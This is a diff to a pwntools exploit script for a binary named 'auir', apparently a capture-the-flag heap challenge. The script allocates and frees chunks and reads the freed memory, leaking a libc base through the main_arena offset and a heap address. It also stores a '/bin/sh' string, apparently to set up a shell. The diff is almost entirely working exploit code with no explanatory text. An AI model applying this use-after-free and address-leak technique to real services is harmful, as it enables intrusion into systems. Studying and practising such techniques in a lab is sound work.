@@ -4,10 +4,11 @@ from pwn import *
 
 context.clear(arch='amd64')
 exe = context.binary = ELF('auir')
+libc = ELF('./libc-2.23.so')
 context.terminal = ['gnome-terminal', '-e']
 
 host = args.HOST or '10.67.0.1'
-port = int(args.PORT or 31761)
+port = int(args.PORT or 32148)
 
 def local(argv=[], *a, **kw):
     '''Execute the target binary locally'''
@@ -85,14 +86,38 @@ def show(index):
 
     prompt()
     io.sendline(str(index))
+"""
+alloc(0x100, "ccc")
+alloc(0x10, "aaa")
+alloc(0x100, "bbb")
+free(1)
+show(1)
+io.recvline()
+addr = unpack(io.recv(8))
+log.success("Heap: " + hex(addr))
 
-def leak_libc():
-    # small bin chunks
-    alloc(200, "A" * 8)
-    alloc(200, "B" * 8)
-    free(0)
-    show(0)
 
-    io.recv()
+exit()
+"""
+alloc(500, "/bin/sh\x00")
+alloc(500, "small")
+alloc(0x28, "fast")
+alloc(0x28, "fast")
+alloc(0x28, "fast")
 
-leak_libc()
+free(1)
+free(3)
+free(2)
+
+show(1)
+io.recvline()
+
+main_arena_off = 0x3c4b78
+addr = unpack(io.recv(8)) - main_arena_off
+log.success("Leak libc: " + hex(addr))
+libc.address = addr
+
+show(2)
+io.recvline()
+addr = unpack(io.recv(8))
+log.success("Heap: " + hex(addr))
